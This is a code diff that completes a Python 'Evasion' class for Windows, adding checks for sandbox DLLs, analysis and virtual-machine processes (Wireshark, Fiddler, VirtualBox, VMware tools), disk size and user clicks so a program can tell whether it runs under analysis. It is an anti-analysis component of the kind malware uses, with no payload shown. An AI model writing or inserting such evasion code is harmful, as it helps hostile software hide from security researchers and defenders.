@@ -1,45 +1,67 @@
 
 import sys
-
-# We need 64 bit wersion
+import psutil
 import win32api
-
-# ========
-# Not finished
-# ========
+import win32process
 
 
 class Evasion:
     def __init__(self):
         return None
     
-    # Function NEED to be finished!!
+
     def check_all_DLL_names(self):
         SandboxEvidence = []
+        sandboxDLLs = ["sbiedll.dll", "api_log.dll", "dir_watch.dll", "vmcheck.dll", "wpespy.dll"]
+        allPids = win32process.EnumProcesses()
+
+        for pid in allPids:
+            try:
+                hProcess = win32api.OpenProcess(0x0410, 0, pid)
+                try:
+                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
+                    for dll in curProcessDLLs:
+                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
+                        for sandboxDLL in sandboxDLLs:
+                            if sandboxDLL in dllName:
+                                if dllName not in SandboxEvidence:
+                                    SandboxEvidence.append(dllName)
+                
+                finally:
+                    win32api.CloseHandle(hProcess)
+            except:
+                pass
 
         if SandboxEvidence:
             return False
         else:
             return True
         
-    # Function NEED to be finished!!
-    def check_all_processes(self):
+    
+    def check_all_processes_names(self):
         EvidenceOfSandbox = []
+        sandboxProcesses = "vmsrvs", "tcpview", "wireshark", "visual basic", "fiddler", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"
+        runningProcesses = [p.name() for p in psutil.process_iter()]
+
+        for process in runningProcesses:
+            for sandboxProcess in sandboxProcesses:
+                if sandboxProcess in str(process):
+                    if process not in EvidenceOfSandbox:
+                        EvidenceOfSandbox.append(process)
+                        break
 
         if not EvidenceOfSandbox:
             return True
         else:
             return False
         
-    # Function not checked!!
+
     def disk_size(self):
         minDiskSizeGB = 50
 
-        # I don't know what it is...
         if len(sys.argv) > 1:
             minDiskSizeGB = float(sys.argv[1])
 
-        # checking free disc space (not checked)
         _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
 
         diskSizeGB = diskSizeBytes/1073741824
@@ -49,7 +71,7 @@ class Evasion:
         else:
             return False
         
-    # Function need to be checked!!
+
     def click_trecker(self):
         count = 0
         minClicks = 10
@@ -69,7 +91,7 @@ class Evasion:
         return True
     
     def main(self):
-        if self.disk_size() and self.click_trecker() and self.check_all_processes and self.check_all_DLL_names():
+        if self.disk_size() and self.click_trecker() and self.check_all_processes_names() and self.check_all_DLL_names():
             return True
         else:
             return False
